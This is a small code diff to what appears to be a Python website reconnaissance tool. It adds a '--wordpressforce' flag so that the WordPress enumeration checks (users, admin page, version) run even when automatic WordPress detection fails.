@@ -936,6 +936,7 @@ atadogan06@gmail.com - onuratakan
 
         parser.add_argument('-wsd', '--webservicedetection', action="store_true", help='Web service detection')
 
+        parser.add_argument('-wpforce', '--wordpressforce', action="store_true", help='Disable the wordpress checking')
         parser.add_argument('-wpus', '--wordpressuser', action="store_true", help='Wordpress user detection with json')
         parser.add_argument('-wpap', '--wordpressadminpage', action="store_true", help='Wordpress admin page detection')
         parser.add_argument('-wpv', '--wordpressversion', action="store_true", help='Wordpress version detection')
@@ -1013,7 +1014,7 @@ atadogan06@gmail.com - onuratakan
 
 
         if args.wordpressuser or args.wordpressadminpage or args.wordpressversion or args.wordpresscron or args.wordpressuploads or args.wordpressincludes or args.wordpressreadme or args.wordpressxmlrpc or args.wordpressfeed or args.wordpressforgotten:
-            if self.get_wordpress():
+            if self.get_wordpress() or args.wordpressforce:
                 if args.wordpressuser:
                     self.get_wordpress_user()
                 if args.wordpressadminpage:
